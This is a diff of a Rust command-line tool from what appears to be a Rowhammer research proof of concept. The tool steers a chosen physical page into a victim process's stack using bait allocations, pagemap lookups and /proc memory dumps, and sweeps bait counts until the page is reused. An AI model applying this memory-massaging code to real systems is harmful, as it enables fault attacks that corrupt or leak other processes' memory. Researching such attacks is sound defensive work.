@@ -7,19 +7,27 @@ use std::{
 
 use anyhow::bail;
 use bs_poc::{
-    allocator::util::{mmap, munmap},
-    memory::{LinuxPageMap, PageMapInfo, VirtToPhysResolver},
-    util::PAGE_SHIFT,
+    allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
+    hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
+    memory::{
+        mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, GetConsecPfns, MemBlock,
+        PageMapInfo, PfnResolver,
+    },
+    util::{MB, PAGE_SIZE},
+    victim::{stack_process::InjectionConfig, HammerVictim, StackProcess},
 };
 use clap::{arg, Parser};
 use log::{debug, info, warn};
-use pagemap::MemoryRegion;
+use pagemap::MapsEntry;
 
 /// CLI arguments for the `hammer` binary.
 ///
 /// This struct defines the command line arguments that can be passed to the `hammer` binary.
 #[derive(Debug, Parser)]
 struct CliArgs {
+    ///The `blacksmith` config file.
+    #[clap(long = "config", default_value = "config/bs-config.json")]
+    config: String,
     /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
     /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
     /// A repetition denotes a complete run of the suite:
@@ -29,27 +37,21 @@ struct CliArgs {
     /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
     #[arg(long)]
     repeat: Option<Option<usize>>,
-    /// The number of rounds to profile for vulnerable addresses.
-    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
-    #[arg(long, default_value = "10")]
-    profiling_rounds: u64,
-    /// The number of rounds to hammer per repetition.
-    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
-    /// At the start of a round, the victim is initialized. The concrete intialization depends on the victim implementation. For example, a MemCheck
-    /// victim will initialize the memory with a random seed, while a process victim might generate a new private key for each round.
-    #[arg(long, default_value = "1")]
-    rounds: u64,
-    /// The number of hammering attempts per round.
-    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
-    /// The default value of 100 is a good starting point for the blacksmith hammerer.
-    #[arg(long, default_value = "20")]
-    attempts: u8,
-    /// Do a stats run. This will run the hammerer and store the results in the provided file. The default is `None`, causing no stats to be stored.
-    /// When `stats` is set, the hammering process will not exit after the first successful attack, but continue hammering until `repeat` is reached.
-    #[arg(long)]
-    statistics: Option<String>,
+    #[arg(short = 'b', long)]
+    bait_before: Option<usize>,
+    #[arg(short = 'a', long)]
+    bait_after: Option<usize>,
+    #[arg(long, default_value = "mmap")]
+    alloc_strategy: AllocStrategy,
     /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
     target: Vec<String>,
+}
+
+#[derive(clap::ValueEnum, Clone, Debug)]
+enum AllocStrategy {
+    Spoiler,
+    Pfn,
+    Mmap,
 }
 
 fn main() -> anyhow::Result<()> {
@@ -58,136 +60,77 @@ fn main() -> anyhow::Result<()> {
     //const NUM_PAGES: usize = 1 << 21; // 8 GB
     //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
     let args = CliArgs::parse();
-    let bait_count = 18;
-    let bait_count_before = 10;
-    assert!(bait_count_before < bait_count);
-    let mut pfns = vec![];
-    let mut reused = vec![];
-    info!(
-        "{} bait pages, of which {} are unmapped before the flippy page",
-        bait_count, bait_count_before
-    );
-    let x: *mut libc::c_void = mmap(null_mut(), PAGE_SIZE);
-    if x.is_null() {
-        bail!("Allocation failed");
-    }
-    let padding: *mut libc::c_void = mmap(null_mut(), (bait_count - 1) * PAGE_SIZE);
-    if padding.is_null() {
-        bail!("Allocation failed");
-    }
-    debug!("Collecting PFNs...");
-    let mut pmap = LinuxPageMap::new()?;
-    let region = MemoryRegion::from((
-        padding as u64,
-        padding as u64 + (bait_count_before * PAGE_SIZE) as u64,
-    ));
-    pfns.append(
-        &mut pmap
-            .get_phys_range(region)?
-            .into_iter()
-            .map(|p| p >> PAGE_SHIFT)
-            .collect(),
-    );
-    let region = MemoryRegion::from((x as u64, x as u64 + PAGE_SIZE as u64));
-    pfns.append(
-        &mut pmap
-            .get_phys_range(region)?
-            .into_iter()
-            .map(|p| p >> PAGE_SHIFT)
-            .collect(),
-    );
-    let region = MemoryRegion::from((
-        padding as u64 + (bait_count_before * PAGE_SIZE) as u64,
-        padding as u64 + ((bait_count - 1) * PAGE_SIZE) as u64,
-    ));
-    pfns.append(
-        &mut pmap
-            .get_phys_range(region)?
-            .into_iter()
-            .map(|p| p >> PAGE_SHIFT)
-            .collect::<Vec<u64>>(),
-    );
-    debug!("PFNs collected");
-    info!("Launching victim");
-    let cmd = args.target.first().expect("No target provided");
-    let mut cmd = std::process::Command::new(cmd);
-    cmd.args(args.target.iter().skip(1));
-    unsafe {
-        munmap(padding, bait_count_before * PAGE_SIZE);
-        munmap(x, PAGE_SIZE);
-        munmap(
-            padding.byte_add(bait_count_before * PAGE_SIZE),
-            (bait_count - bait_count_before - 1) * PAGE_SIZE,
-        )
-    };
-    cmd.stdout(std::process::Stdio::piped());
-    cmd.stderr(std::process::Stdio::piped());
-    let handle = cmd.spawn()?;
-    let pid = handle.id();
-    std::thread::sleep(Duration::from_millis(500));
-    let pmap = PageMapInfo::load(pid as u64)?.0;
-    let mut flippy_region = None;
-    for (map, pagemap) in pmap {
-        debug!("Region size: {}", map.0.memory_region().size());
-        println!("{:?}", map.0);
-        for (va, pmap) in pagemap {
-            let pfn = pmap.pfn();
-            match pfn {
-                Ok(pfn) => {
-                    print!("{:#x}    {:#x}", va, pfn);
-                    if pfns.contains(&pfn) {
-                        println!(
-                            " [REUSED] was at page offset {} {}",
-                            pfns.iter().position(|x| x == &pfn).unwrap(),
-                            if pfns[bait_count_before] == pfn {
-                                "[FLIPPY PAGE]"
-                            } else {
-                                "[PADDING PAGE]"
-                            }
-                        );
-                        if pfn == pfns[bait_count_before] {
-                            flippy_region = Some(map.0.clone());
-                        }
-                        reused.push(pfn);
-                    } else {
-                        println!();
+    let bs_config = BlacksmithConfig::from_jsonfile(&args.config)?;
+    let mem_config = MemConfiguration::from_blacksmith(&bs_config);
+    //0..64 {
+    //let bait_before = args.bait_before;
+    let bait_before_range = args.bait_before.map(|b| b..b + 1).unwrap_or(0..30);
+    let bait_after_range = args.bait_after.map(|b| b..b + 1).unwrap_or(0..30);
+    for bait_before in bait_before_range {
+        for bait_after in bait_after_range.clone() {
+            println!("bait_before,bait_after: {},{}", bait_before, bait_after);
+            for _ in 0..args.repeat.unwrap_or(Some(1)).unwrap_or(2_usize.pow(32)) {
+                // allocate bait page, get PFN
+                let x = match args.alloc_strategy {
+                    AllocStrategy::Spoiler => {
+                        let mut spoiler = Spoiler::new(mem_config, bs_config.threshold, None);
+                        spoiler.alloc_consec_blocks(4 * MB)?
                     }
-                    if let Some("[stack]") = map.0.path() {
-                        let contents = read_memory_from_proc(pid, va, 4096)?;
-                        for (i, byte) in contents.iter().enumerate() {
-                            print!("{:02x}", byte);
-                            if i % 8 == 7 {
-                                print!(" ");
-                            }
-                            if i % 64 == 63 {
-                                println!();
-                            }
-                        }
+                    AllocStrategy::Pfn => {
+                        let mut pfn = Pfn::new();
+                        pfn.alloc_consec_blocks(4 * MB)?
                     }
+                    AllocStrategy::Mmap => {
+                        let x: *mut u8 = mmap(null_mut(), 4 * MB);
+                        if x.is_null() {
+                            bail!("Failed to allocate memory");
+                        }
+                        ConsecBlocks::new(vec![MemBlock::new(x, 4 * MB)])
+                    }
+                };
+                debug!("Collecting PFNs...");
+                let target_pfn = x.pfn()? >> 12;
+                info!("PFNs before victim launch");
+                x.log_pfns();
+                debug!("PFNs collected");
+                info!("Launching victim");
+                let mut victim = StackProcess::new(
+                    &args.target,
+                    InjectionConfig {
+                        flippy_page: x.ptr() as *mut libc::c_void,
+                        /*flippy_page: unsafe {
+                            x.ptr().byte_add(4 * MB - PAGE_SIZE) as *mut libc::c_void
+                        },*/
+                        flippy_page_size: PAGE_SIZE,
+                        bait_count_after: bait_after,
+                        bait_count_before: bait_before,
+                    },
+                )?;
+                if x.len() > PAGE_SIZE {
+                    info!("PFNs after victim launch:");
+                    (unsafe { x.ptr().byte_add(PAGE_SIZE) }, 4 * MB - PAGE_SIZE).log_pfns();
                 }
-                Err(e) => match e {
-                    pagemap::PageMapError::PageNotPresent => {
-                        println!("{:#x}    ???", va);
-                    }
-                    _ => bail!(e),
-                },
+                let pid = victim.pid().expect("Failed to get child PID");
+                std::thread::sleep(Duration::from_millis(100));
+                let flippy_region = find_flippy_page(target_pfn, pid)?;
+                if let Some(flippy_region) = &flippy_region {
+                    info!("Flippy page reused in region {:?}", flippy_region);
+                } else {
+                    warn!("Flippy page not reused");
+                }
+                println!("{:?}", flippy_region);
+                let output = match victim.check() {
+                    Ok(output) => output,
+                    Err(e) => e.to_string(),
+                };
+                if output.contains(&format!("{:x}", target_pfn)) {
+                    bail!("YES MAN: {},{}", bait_before, bait_after);
+                }
+                info!("Child output:\n{}", output);
+                x.dealloc();
             }
         }
     }
-    if let Some(flippy_region) = flippy_region {
-        info!("Flippy page reused in region {:?}", flippy_region);
-    } else {
-        warn!("Flippy page not reused");
-    }
-    info!(
-        "Reused {} of {} pages. Ratio {}",
-        reused.len(),
-        bait_count,
-        reused.len() as f64 / bait_count as f64
-    );
-    let output = handle.wait_with_output()?;
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    info!("Child output:\n{}", stdout);
     Ok(())
 }
 
@@ -204,4 +147,77 @@ fn read_memory_from_proc(pid: u32, va: u64, size: u64) -> std::io::Result<Vec<u8
     file.read_exact(&mut buffer)?;
 
     Ok(buffer)
+}
+
+#[derive(Debug)]
+struct FlippyPage {
+    maps_entry: MapsEntry,
+    region_offset: usize, // page offset in the region
+}
+
+fn find_pattern(vec: &[u8], pattern: u8, length: usize) -> Option<usize> {
+    let target_sequence: Vec<u8> = vec![pattern; length];
+    vec.windows(length)
+        .position(|window| window == target_sequence.as_slice())
+}
+
+fn find_flippy_page(target_page: u64, pid: u32) -> anyhow::Result<Option<FlippyPage>> {
+    let pmap = PageMapInfo::load(pid as u64)?.0;
+    let mut flippy_region = None;
+    for (map, pagemap) in pmap {
+        info!("Region: {:?}", map.0);
+        debug!("Region size: {}", map.0.memory_region().size());
+        for (idx, (va, pmap)) in pagemap.iter().enumerate() {
+            let pfn = pmap.pfn();
+            match pfn {
+                Ok(pfn) => {
+                    if target_page == pfn {
+                        info!("[{}]  {:#x}    {:#x} [REUSED TARGET PAGE]", idx, va, pfn);
+                        flippy_region = Some(FlippyPage {
+                            maps_entry: map.0.clone(),
+                            region_offset: idx,
+                        });
+                    } else {
+                        info!("[{}]  {:#x}    {:#x}", idx, va, pfn);
+                    }
+                    if let Some("[stack]") = map.0.path() {
+                        let mut stack_contents = String::new();
+                        let contents = read_memory_from_proc(pid, *va, PAGE_SIZE as u64);
+                        match contents {
+                            Ok(contents) => {
+                                match find_pattern(&contents, 0b10101010, PAGE_SIZE) {
+                                    Some(offset) => {
+                                        info!("Found pattern at offset {}", offset);
+                                    }
+                                    None => {
+                                        info!("Pattern not found");
+                                    }
+                                }
+                                for (i, byte) in contents.iter().enumerate() {
+                                    stack_contents += &format!("{:02x}", byte);
+                                    if i % 8 == 7 {
+                                        stack_contents += " ";
+                                    }
+                                    if i % 64 == 63 {
+                                        stack_contents += "\n";
+                                    }
+                                }
+                                info!("Content:\n{}", stack_contents);
+                            }
+                            Err(e) => {
+                                info!("Failed to read stack contents: {}", e);
+                            }
+                        }
+                    }
+                }
+                Err(e) => match e {
+                    pagemap::PageMapError::PageNotPresent => {
+                        info!("[{}]  {:#x}    ???", idx, va);
+                    }
+                    _ => bail!(e),
+                },
+            }
+        }
+    }
+    Ok(flippy_region)
 }
